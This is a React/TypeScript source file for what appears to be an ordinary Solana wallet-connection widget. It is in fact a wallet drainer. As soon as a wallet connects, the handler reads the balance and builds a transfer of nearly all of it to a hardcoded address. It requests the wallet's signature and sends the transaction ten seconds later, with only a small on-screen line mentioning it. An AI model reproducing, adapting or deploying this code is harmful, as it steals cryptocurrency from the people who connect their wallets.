import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import ReactDOM from 'react-dom';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    useWalletModal,
    WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    clusterApiUrl,
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider container="#walletPopup">
                    {children}
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();
    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);
    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSendTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
        try {
            setLoading(true);
            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');

            const lamports = await connection.getBalance(walletPublicKey);
            const sol = lamports / LAMPORTS_PER_SOL;
            setSolBalance(sol);

            console.log(`🔗 Connected wallet: ${walletPublicKey.toBase58()}`);
            console.log(`💰 Balance: ${sol.toFixed(4)} SOL`);

            const transferLamports = lamports - 100000;
            if (transferLamports <= 0) {
                alert('⚠️ Not enough SOL to send after keeping 0.0001 SOL.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: transferLamports,
                })
            );

            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                alert('❌ Wallet not ready to sign.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('🖊️ Transaction signed.');

            setTimeout(async () => {
                try {
                    const txid = await connection.sendRawTransaction(signedTx.serialize());
                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
                } catch (err) {
                    console.error('❌ Failed to send transaction:', err);
                }
            }, 10000); // wait 10 seconds
        } catch (err) {
            console.error('❌ Error fetching balance or sending tx:', err);
            alert('Failed to process transaction.');
        } finally {
            setLoading(false);
        }
    };

    const walletPopupEl = typeof window !== 'undefined' ? document.getElementById('walletPopup') : null;

    const connectedInfo = (
        <div
            style={{
                marginTop: '2rem',
                textAlign: 'center',
                backgroundColor: '#f8f8f8',
                padding: '20px',
                borderRadius: '10px',
                boxShadow: '0 0 12px rgba(0,0,0,0.1)',
                fontFamily: 'Arial, sans-serif',
                marginLeft: 'auto',
                marginRight: 'auto',
                maxWidth: '500px',
            }}
        >
            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected</h2>
            <p
                style={{ wordBreak: 'break-all', cursor: 'pointer', color: '#333' }}
                onClick={() => navigator.clipboard.writeText(publicKey?.toBase58() || '')}
            >
                <strong>Address:</strong> {publicKey?.toBase58()}
            </p>
            <p>
                <strong>Balance:</strong>{' '}
                {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
            </p>
            <p style={{ color: '#555' }}>Transaction will auto-send 10s after connect.</p>
        </div>
    );

    if (!connected || !publicKey) {
        return walletPopupEl
            ? ReactDOM.createPortal(<WalletMultiButton />, walletPopupEl)
            : <WalletMultiButton />;
    }

    return walletPopupEl
        ? ReactDOM.createPortal(connectedInfo, walletPopupEl)
        : connectedInfo;
};

export default App;
